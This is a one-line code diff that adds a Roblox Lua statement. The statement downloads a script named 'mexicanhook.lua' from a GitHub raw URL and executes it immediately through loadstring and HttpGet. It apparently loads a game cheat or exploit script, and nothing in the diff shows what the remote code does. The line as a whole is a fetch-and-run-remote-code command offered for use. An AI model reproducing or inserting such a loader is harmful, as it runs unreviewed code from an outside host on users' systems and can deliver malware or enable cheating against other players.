@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/basedproperty/Mexicanhook/main/mexicanhook.lua",true))()
